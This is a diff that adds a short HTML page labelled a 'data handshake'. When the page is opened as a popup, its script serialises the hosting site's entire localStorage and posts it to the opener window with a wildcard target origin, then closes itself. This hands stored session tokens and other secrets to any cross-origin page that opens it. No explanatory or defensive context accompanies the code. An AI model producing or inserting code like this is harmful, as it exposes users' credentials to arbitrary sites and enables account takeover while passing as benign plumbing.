@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>Data Handshake Outbound</title></head>
+<body>
+<script>
+    if (window.opener) {
+        // Dispatches the compiled string block directly back to the Vercel tab context
+        window.opener.postMessage({
+            type: "void_secure_payload",
+            storage: JSON.stringify(localStorage)
+        }, "*");
+        setTimeout(() => window.close(), 50);
+    }
+</script>
+</body>
+</html>
